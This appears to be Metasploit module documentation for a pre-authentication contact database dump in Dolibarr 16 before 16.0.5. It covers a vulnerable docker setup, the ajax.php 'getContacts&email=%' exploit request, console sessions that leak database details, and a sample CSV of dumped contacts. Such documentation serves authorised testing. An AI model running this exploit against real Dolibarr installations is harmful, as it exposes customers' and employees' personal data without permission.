## Vulnerable Application
### Dolibarr 16 pre-auth contact database dump

Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.
An unauthenticated attacker may retreive a company’s entire customer file, prospects, suppliers,
and potentially employee information if a contact file exists.
Both public and private notes are also included in the dump.

### Dolibarr GitHub Repository & Dolibarr setup with vulnerable docker image

If you need to setup Dolibarr, this is the official GitHub Repository from Dolibarr or via docker with a unofficial but working image and docker-compose.
``` 
Official GitHub Repository:

https://github.com/Dolibarr/dolibarr/tree/16.0.4 
```

```
Unofficial image with docker-compose:

docker pull tuxgasy/dolibarr:16.0.4

Important: This image dont contains database. So you need to link it with a database container.

Use Docker Compose to integrate it with MariaDB (you can also use MySQL if you prefer).

Create docker-compose.yml file as following:

version: "3"

services:
    mariadb:
        image: mariadb:latest
        environment:
            MARIADB_DATABASE: dolibarr
            MARIADB_USER: dolibarr 
            MARIADB_PASSWORD: dolibarr
            MARIADB_RANDOM_ROOT_PASSWORD: 'yes'
    web:
        image: tuxgasy/dolibarr:16.0.4
        environment:
            DOLI_DB_HOST: mariadb
            DOLI_DB_USER: dolibarr
            DOLI_DB_PASSWORD: dolibarr
            DOLI_DB_NAME: dolibarr
            DOLI_URL_ROOT: 'http://0.0.0.0'
            PHP_INI_DATE_TIMEZONE: 'Europe/Paris'
        ports:
            - "80:80"
```

Then run all services docker-compose up -d. Now, go to http://0.0.0.0 to access to the new Dolibarr installation.

## Dolibarr Configuration

Default credentials : admin/admin

Important:
Once Dolibarr is installed,
you will have to activate the Third-parties module and create at least one contact in the latter to validate that the module works.

To use this module, you must first enable it using an administrator account, via the menu option "Home - Setup - Modules/Applications".

Choose the tab where the module is listed. Then click on "Activate".

Finally, you can create a member via "Third-parties - New Contact/Address".

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/dolibarr_16_contact_dump`
4. Do: `set RHOSTS [IP] or [Dolibarr domain]`
5. Do: `exploit`
6. You should retrieve a file.

## Options

### TARGETURI

The path to Dolibarr instance.  Defaults to `/`,  `http://dolibarrdomain/`

## Scenarios

### Dolibarr 16.0.4 on Ubuntu 22.10
Exploitation of a Dolibarr 16.0.4 without verbose.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS http://[Dolibarr domain]/
RHOSTS => http://[Dolibarr domain]/
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

[+] Detected vulnerable Dolibarr version: 16.0.4
[+] Database type: mysqli
[+] Database name: dolibarr
[+] Database user: root
[+] Database host: mariadb
[+] Database port: 3306
[+] Found 11 contacts.
[+] [RHOSTS]:[RPORT] - File saved in: /home/kali/.msf4/loot/20230329082801_default_X.X.X.X_dolibarr_212597.csv
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Dolibarr 16.0.4 on Ubuntu 22.10
Exploitation of a Dolibarr 16.0.4 with verbose.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS [X.X.X.X]
RHOSTS => X.X.X.X
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

--Check Host--
[+] Domain: X.X.X.X
[+] Target_URI: /
[+] Response Code: 200
[+] Response Body: <!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex,follow">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="author" content="Dolibarr Development Team">
<link rel="shortcut icon" type="image/x-icon" href="/theme/dolibarr_256x256_color.png"/>
<link rel="manifest" href="/theme/eldy/manifest.json.php" />
<title>Login @ 16.0.4</title>

[...]

</body>
</html>
<!-- END PHP TEMPLATE -->

[+] Detected vulnerable Dolibarr version: 16.0.4
--Exploit resquest--
Domain: X.X.X.X
Target_URI: /public/ticket/ajax/ajax.php?action=getContacts&email=%
--Exploit response--
[+] Response Code: 200
[+] Response Body: {"contacts":[{"db":{"db":{},"type":"mysqli","forcecharset":"utf8","forcecollate":"utf8_unicode_ci","connected":true,"database_selected":true,"database_name":"dolibarr","database_user":"root","database_host":"mariadb",[...],"socname":null,"mail":""}],"error":""}
[+] Database type: mysqli
[+] Database name: dolibarr
[+] Database user: root
[+] Database host: mariadb
[+] Database port: 3306
[+] Found 11 contacts.
[+] X.X.X.X:[RPORT] - File saved in: /home/kali/.msf4/loot/20230329092036_default_X.X.X.X_dolibarr_278659.csv
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Dolibarr 16.0.4 on Ubuntu 22.10
Attempted exploitation of a Dolibarr 16.0.4 without verbose and empty database.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
RHOSTS => X.X.X.X
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

[+] Detected vulnerable Dolibarr version: 16.0.4
[-] Dolibarr database empty
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Dolibarr 17.0.0 on Ubuntu 22.10
Attempted exploitation of a Dolibarr 17.0.0 with verbose.
```
msf6 > use auxiliary/scanner/http/dolibarr_16_contact_dump 
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
RHOSTS => X.X.X.X
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit

--Check Host--
[+] Domain: X.X.X.X
[+] Target_URI: /
[+] Response Code: 200
[+] Response Body: <!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="author" content="Dolibarr Development Team">
<link rel="shortcut icon" type="image/x-icon" href="/theme/dolibarr_256x256_color.png"/>
<link rel="manifest" href="/theme/eldy/manifest.json.php" />
<title>Login @ 17.0.0</title>

[...]

</body>
</html>
<!-- END PHP TEMPLATE -->

[-] Detected apparently non-vulnerable Dolibarr version: 17.0.0
[*] Proceeding to exploit anyway
--Exploit resquest--
Domain: X.X.X.X
Target_URI: /public/ticket/ajax/ajax.php?action=getContacts&email=%
--Exploit response--
[-] Exploit response code: 404
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Contact database dump
Here is an example of what your .csv file would look like if the contact exfiltration was successful.

| id | country | country_code | state | state_code  |  region | region_code  |  note_public | note_private  | note  |  name |  lastname | firstname  |  civility_id | date_creation  | civility_code  | civility  | civilite  | address  | zip  |  town | poste  | email  |
|-----|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|   1  |  FR | Rhône  |  69 |   |   |   |   |   |   |   | Latourelle  | Valentine  |   | 1680275145  | MME  |  Mrs. |   | 1600, Place du Jeu de Paume  | 69400  | VILLEFRANCHE-SUR-SAÔNE  |  CEO |  valentine@latourelle.latourelle |
|  2  | FR  |   |   |   |   |   |   | don't make any discount I don't like him  |   |   |  Bolduc | Hugues  |   | 1680275611  | MR  | Mr.  |   | 1200, rue Bonneterie  | 59370   |  MONS-EN-BAROEUL |  CEO | hugues@bolduc.bolduc  |
|   3  |  FR | Rhône  |  69 |   |   |   |   |   |   |   | Gamelin  | Felicien  |   | 1680275763  | MR  | Mr. |   | 5100, rue de la Boatie  |  69000 | Lyon  | DSI  | felicien@gamelin.gamelin  |

